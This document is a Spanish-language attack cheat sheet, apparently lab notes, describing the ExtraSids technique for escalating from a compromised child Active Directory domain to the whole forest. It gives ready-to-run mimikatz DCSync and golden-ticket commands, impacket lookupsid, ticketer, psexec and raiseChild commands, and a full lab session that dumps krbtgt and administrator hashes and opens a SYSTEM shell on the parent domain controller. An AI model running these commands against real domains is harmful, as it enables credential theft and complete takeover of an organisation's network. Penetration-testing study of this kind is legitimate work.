# ExtraSids Attack - Mimikatz

## Explicación rápida

- Este ataque permite comprometer a un dominio padre desde que el dominio hijo ya fue comprometido bajo el mismo **AD FOREST**.
- ![](https://s38063.pcdn.co/wp-content/uploads/2022/06/Active-Directory-forest-.jpg.optimal.jpg)
- Este ataque se basa en la explotación de propiedad sidHistory y la falta de protección de filtrado de SIDs (Sid filtering) entre dominios dentro de un AD FOREST.
- Para hacer este ataque se necesitan las siguientes condiciones:
    - HASH NT del KRBTGT del dominio hijo: Hay que generar un Golden Ticket.
    - SID del dominio fijo.
    - Nombre de un usuero objetivo en el dominio hijo.
    - FQDN del dominio hijo.
    - SID del grupo Enterprise Admins del dominio padre. 
- Debido a la ausencia de SID filtering, cuando este usuario autenticado con un SID modificado accede al dominio padre, est ratado como si fuera un miembro del grupo Admins, así dandole privilegios sobre todo el AD FOREST.

## Creación del golden ticket con mimikatz
- [Golden Ticket Attack más info](./goldenTicketAttack.md)
- `mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt`
- `kerberos::golden /user:hacker /domain:DOMAIN.LOCAL /sid:SID-FOR-THE-CHILD-DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:ENTERPRISE-ADMIN-SID /ptt`

## Obtener SID de enterprise admin
- `Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`

## Mediante Linux

### Conseguir el SID con impacket
- `impacket-lookupsid DOMAIN.LOCAL/USER@DC-IP`
- Ejemplo: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` 
    - `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`

## Golden ticket con impacket
- `impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker`
- Exportamos la variable del ticket kerberos: `export KRB5CCNAME=hacker.ccache`
- Utilizamos psexec de impacket para entrar con este ticket `impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP`

## Automatizar este proceso con raiseChild de impacket
- Esta herramienta automatiza la escalación de dominio hijo a padre, necesitamos especificar el dominio objetivo con su DC, y credenciales en el dominio hijo. El script hará lo demás.
- `impacket-raiseChild -target-exec DC-IP CHILD.DOMAIN.LOCAL/user`

##### Ejemplo
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file KNAMkjZu.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service pxRD on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service pxRD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```